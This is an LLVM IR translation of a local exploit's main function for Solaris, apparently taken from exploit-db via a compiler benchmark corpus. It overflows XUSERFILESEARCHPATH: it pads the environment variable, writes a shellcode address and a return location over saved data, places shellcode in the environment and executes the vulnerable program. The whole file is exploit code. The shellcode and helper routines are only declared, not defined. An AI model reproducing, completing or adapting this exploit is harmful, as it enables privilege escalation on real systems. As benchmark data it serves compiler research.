; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21058.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21058.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SP = common dso_local global i32 0, align 4
@RETLOC = common dso_local global i64 0, align 8
@__const.main.ev1 = private unnamed_addr constant [21 x i8] c"XUSERFILESEARCHPATH=\00", align 16
@VULPROG = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [22 x i8] c"Using retloc = 0x%x \0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"execle\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2048 x i8], align 16
  %7 = alloca [48 x i8], align 16
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca [24 x i8*], align 16
  %11 = alloca [24 x i8*], align 16
  %12 = alloca [64 x i8], align 16
  %13 = alloca i64, align 8
  %14 = alloca i32*, align 8
  %15 = alloca [21 x i8], align 16
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @SP, align 4
  %19 = sext i32 %18 to i64
  store i64 %19, i64* %9, align 8
  %20 = load i64, i64* @RETLOC, align 8
  store i64 %20, i64* %13, align 8
  %21 = bitcast [21 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %21, i8* align 16 getelementptr inbounds ([21 x i8], [21 x i8]* @__const.main.ev1, i32 0, i32 0), i64 21, i1 false)
  store i64 1024, i64* %17, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sgt i32 %22, 1
  br i1 %23, label %24, label %31

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i64 @atoi(i8* %27)
  %29 = load i64, i64* %13, align 8
  %30 = add nsw i64 %29, %28
  store i64 %30, i64* %13, align 8
  br label %31

31:                                               ; preds = %24, %2
  %32 = load i8*, i8** @VULPROG, align 8
  %33 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  store i8* %32, i8** %33, align 16
  %34 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 1
  store i8* null, i8** %34, align 8
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %36 = call i32 @bzero(i8* %35, i32 2048)
  %37 = getelementptr inbounds [21 x i8], [21 x i8]* %15, i64 0, i64 0
  %38 = call i64 @strlen(i8* %37)
  store i64 %38, i64* %16, align 8
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %40 = getelementptr inbounds [21 x i8], [21 x i8]* %15, i64 0, i64 0
  %41 = load i64, i64* %16, align 8
  %42 = trunc i64 %41 to i32
  %43 = call i32 @memcpy(i8* %39, i8* %40, i32 %42)
  %44 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %45 = load i64, i64* %16, align 8
  %46 = getelementptr inbounds i8, i8* %44, i64 %45
  %47 = load i64, i64* %17, align 8
  %48 = add i64 %47, 48
  %49 = trunc i64 %48 to i32
  %50 = call i32 @memset(i8* %46, float 6.500000e+01, i32 %49)
  %51 = getelementptr inbounds [64 x i8], [64 x i8]* %12, i64 0, i64 0
  %52 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 0
  store i8* %51, i8** %52, align 16
  %53 = load i8*, i8** @shellcode, align 8
  %54 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 1
  store i8* %53, i8** %54, align 8
  %55 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %56 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 2
  store i8* %55, i8** %56, align 16
  %57 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 3
  store i8* null, i8** %57, align 8
  %58 = call i32 (...) @get_sp()
  %59 = ashr i32 %58, 24
  %60 = trunc i32 %59 to i8
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 239
  br i1 %62, label %63, label %69

63:                                               ; preds = %31
  %64 = load i32, i32* @SP, align 4
  %65 = sub nsw i32 %64, 264175616
  %66 = sext i32 %65 to i64
  store i64 %66, i64* %9, align 8
  %67 = load i64, i64* %13, align 8
  %68 = sub nsw i64 %67, 264175616
  store i64 %68, i64* %13, align 8
  br label %69

69:                                               ; preds = %63, %31
  %70 = load i64, i64* %9, align 8
  %71 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  %72 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 0
  %73 = call i64 @get_shelladdr(i64 %70, i8** %71, i8** %72)
  store i64 %73, i64* %8, align 8
  %74 = load i64, i64* %13, align 8
  %75 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i64 %74)
  %76 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %77 = call i32 @memset(i8* %76, float -1.000000e+00, i32 48)
  %78 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %79 = bitcast i8* %78 to i32*
  store i32* %79, i32** %14, align 8
  %80 = load i32*, i32** %14, align 8
  %81 = getelementptr inbounds i32, i32* %80, i64 0
  store i32 -7, i32* %81, align 4
  %82 = load i64, i64* %8, align 8
  %83 = sub nsw i64 %82, 8
  %84 = trunc i64 %83 to i32
  %85 = load i32*, i32** %14, align 8
  %86 = getelementptr inbounds i32, i32* %85, i64 2
  store i32 %84, i32* %86, align 4
  %87 = load i64, i64* %13, align 8
  %88 = sub nsw i64 %87, 8
  %89 = trunc i64 %88 to i32
  %90 = load i32*, i32** %14, align 8
  %91 = getelementptr inbounds i32, i32* %90, i64 8
  store i32 %89, i32* %91, align 4
  %92 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %93 = load i64, i64* %16, align 8
  %94 = getelementptr inbounds i8, i8* %92, i64 %93
  %95 = load i64, i64* %17, align 8
  %96 = getelementptr inbounds i8, i8* %94, i64 %95
  %97 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %98 = call i32 @memcpy(i8* %96, i8* %97, i32 48)
  %99 = load i8*, i8** @VULPROG, align 8
  %100 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  %101 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 0
  %102 = call i32 @execve(i8* %99, i8** %100, i8** %101)
  %103 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %104 = load i32, i32* %3, align 4
  ret i32 %104
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, float, i32) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i64 @get_shelladdr(i64, i8**, i8**) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
